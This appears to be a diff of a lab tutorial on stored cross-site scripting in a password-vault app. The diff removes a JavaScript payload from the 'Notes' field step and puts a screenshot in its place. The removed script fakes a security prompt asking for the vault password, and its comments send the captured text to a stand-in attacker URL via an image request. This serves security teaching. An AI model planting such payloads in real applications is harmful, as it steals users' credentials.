@@ -39,18 +39,9 @@ By the end, we’ll understand why **input handling** is one of the most critica
 12. Reload page to clear the search field.
 13. Navigate to a vault, click on “Edit password”.
 14. In the “Notes” field paste the JS payload that will create a fake popup asking for sensitive information.
-<script>
-    var phishing_prompt = prompt("Security Alert: For your protection, please re-enter your VAULT password.");
-    if (phishing_prompt) {
-        // In a real scenario, you would send 'phishing_prompt' to an attacker-controlled server.
-        // For demonstration, we'll just show an alert with the entered data.
-        alert("Captured data (for demo): " + phishing_prompt + "\n(In a real attack, this would be sent to the attacker.)");
 
-        // To send it to an attacker server (similar to Task 2):
-        // var attacker_server_url = 'https://YOUR_ATTACKER_SERVER_URL/log_phish'; 
-        // new Image().src = attacker_server_url + '?phished_data=' + encodeURIComponent(phishing_prompt);
-    }
-</script>
+<img width="60%" alt="image" src="https://github.com/user-attachments/assets/7c18084d-57d3-46f0-9d53-7f53cec0a679" />
+
 15. Click “Update Password” to save and have a partner navigate to the vault to edit details. 
 16. Tne JS embedded in the “Notes” field will popup automatically, asking for their vault password. 
 17. If they enter information an alert box will show the captured data.
